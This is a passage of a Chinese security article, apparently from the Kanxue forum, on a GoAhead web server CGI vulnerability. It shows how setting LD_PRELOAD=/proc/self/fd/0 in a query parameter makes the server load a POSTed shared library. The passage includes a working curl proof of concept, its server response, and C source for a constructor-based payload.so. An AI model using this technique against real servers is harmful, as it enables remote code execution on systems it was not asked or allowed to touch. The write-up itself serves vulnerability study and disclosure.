normal;">LA_PRELOAD</span>，可以指定加载本地的共享库，进行代码执行，但是如何变成远程危害命令执行呢？也就是如何上传恶意代码，并且通过环境变量：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">LA_PRELOAD</span>，进行指定呢？</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">在前面分析中我们得知，由于<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">goahead webserver</span>在处理cgi扩展时，当用户post提交了数据，<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">goahead webserver</span> 会将其存到 <span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">/tmp/cgi***</span> 中，这不就是可以恶意代码了嘛？</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">但是如何知道上传的全路径名称呢？爆破还是其他，都不是好的方法。由于cgi处理进程中，将标准输入、输出重定向到了/tmp/cgi***，所以现在问题，就是我们能不能找到一个路径连接，是指向标准输入或输入的呢？Linux上刚好存在这种符号链接：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">/proc/self/fd/0和/dev/stdin</span>，于是我们可以在HTTP参数中内置？<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">LD_PRELOAD=/proc/self/fd/0</span>命令。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">整个goahead-cgi的执行流程图如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsTynEXkzCpkLMnXGHd2cgxpFG1SDp4hCP9ZFYPmjrhzzNTdMzXAyR8w/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 307.972px !important;"></p><h3 style="margin-left: 8px;margin-right: 8px;"><br></h3><p><br></p><h3 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">3. POC</span></strong></span></h3><p><br></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">daizy@daizy:~/workplace/CDemo$
 curl -X &nbsp; POST --data-binary @payload.so &nbsp; 
http://172.20.94.98:8888/cgi-bin/cgi_test?LD_PRELOAD=/proc/self/fd/0 -i |
 &nbsp; head</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp; % &nbsp; Total&nbsp;&nbsp;&nbsp; % Received % Xferd&nbsp; Average Speed &nbsp;&nbsp;Time&nbsp;&nbsp;&nbsp; Time&nbsp;&nbsp;&nbsp;&nbsp; Time&nbsp; Current</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dload&nbsp; Upload&nbsp;&nbsp; Total&nbsp;&nbsp; Spent&nbsp;&nbsp;&nbsp; Left&nbsp; Speed</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">100&nbsp; 8128&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp; 100&nbsp; 8128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp; 7885&nbsp; 0:00:01&nbsp; 0:00:01 --:--:--&nbsp; 7891</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">curl: (18) transfer closed with &nbsp; outstanding read data remaining</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">HTTP/1.1 200 OK</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">Date: Thu Dec 28 12:33:37 2017</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">Transfer-Encoding: chunked</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">Connection: keep-alive</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">X-Frame-Options: SAMEORIGIN</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">Pragma: no-cache</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">Cache-Control: no-cache</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">hacked by daizy</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">其中payload.so是由以下代码编译获得：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;unistd.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">static void before_main(void) __attribute__((constructor));</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">static void before_main(void)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(1, &nbsp; "hacked by daizy\n",16);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">}</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">编译命令：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">gcc -shared -fPIC payload.c -o payload.so</span></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">其中标签属性:constructor,表示该函数由.init初始化时执行，也就是在cgi的扩展main函数之前会被执行。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><h3 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">4. 参考文章</span></strong></span></h3><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">1. https://www.elttam.com.au/blog/goahead/</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">2. https://www.cnblogs.com/net66/p/5609026.html</span></p><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><section label="Copyright © 2014 playhudong All Rights Reserved." style="max-width: 100%;color: rgb(62, 62, 62);"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8G9B6YFlthnv1h3cWDDXGAmK9wQfy6pod114tTuOSIFVeVd0vd1PEwicksgBGmxL0iaC0icX7B9EQzNg/?wx_fmt=png" style="margin-right: auto; margin-left: auto; display: block; box-sizing: border-box !important; overflow-wrap: break-word !important; visibility: visible !important; width: 160px !important; height: 8.44575px !important;"></section><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">本文由看雪论坛 <strong style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">uestcdzy </strong>原创<br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">转载请注明来自看雪社区</span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><p style="margin: 15px 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">热门阅读</span></p><p style="margin: 15px 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><ul class="list-paddingleft-2" style=""><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287391&amp;idx=2&amp;sn=36b62672417c3c56a1d8fb23c378eb83&amp;chksm=b1814d9586f6c483d25fb5a6c5e1654751476feedb40617587cdd878fa7bfafd2784eea05980&amp;scene=21#wechat_redirect" target="_blank">方法 | 在Windows系统上修复Meltdown和Specture CPU漏洞</a></span></p></li><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287415&amp;idx=1&amp;sn=dba14b0b922e4577028ccab4bc6d1451&amp;chksm=b1814dbd86f6c4ab6df058462e0147f59ab8757ab3e65f5fdf6b3058d8d65d146cf4c04a32a6&amp;scene=21#wechat_redirect" target="_blank">通俗理解这次的CPU漏洞，附带修改过带注释源码一份</a></span></p></li><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287434&amp;idx=1&amp;sn=a526b80315d80f63afe73923818dcd70&amp;chksm=b1814dc086f6c4d65f85d18c15738484e113d23b7af5f8c6c6734037bae31fb26e68a286ea8b&amp;scene=21#wechat_redirect" target="_blank">简单看一下 &nbsp;微软新出的内核页表隔离补丁</a></span></p></li><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287434&amp;idx=1&amp;sn=a526b80315d80f63afe73923818dcd70&amp;chksm=b1814dc086f6c4d65f85d18c15738484e113d23b7af5f8c6c6734037bae31fb26e68a286ea8b&amp;scene=21#wechat_redirect" target="_blank"></a><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287468&amp;idx=1&amp;sn=ff2b2d716b79e1003b90e9540b64977e&amp;chksm=b1814de686f6c4f0d7069b2832e8af68a0a1def12ed0afcee3afc90211ea56e82bef7be3e392&amp;scene=21#wechat_redirect" target="_blank">c++实现的一种代码膨胀变形壳</a></span></p></li></ul><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">点击阅读原文/read，</span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">更多干货等着你~</span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8HTpGlibXdQ4YIynJnSjWwOjSroH8JkP00Cpl0TvGwSCibJpPmSmcartSbQUfodq49ulaLk1Yicrem3A/?wx_fmt=jpeg" style="box-sizing: border-box !important; overflow-wrap: break-word !important; visibility: visible !important; width: 542px !important; height: 136.065px !important;"></p><p><br></p><hr/><a href="http://mp.weixin.qq.com/s?timestamp=1515984875&src=3&ver=1&signature=yyLj*6br2FUtW3BtBE3siPPs-NRfvlwjuvH7xFTtLmsOPyUEuRfepE4lmADgDB-KqTGJpoTQDDroKcwkYhW3KXB7fIO6oJiCAMnNHLfKjGyBZsEY4HWhc1u0s-*ie*MBD-9Whzztv-r4qxkToYKkB829H9h1gJQCdSYIq8CttW0=">微信地址</a> | <a href="https://bbs.pediy.com/thread-223793.htm">阅读原文</a>
{% endraw  %}

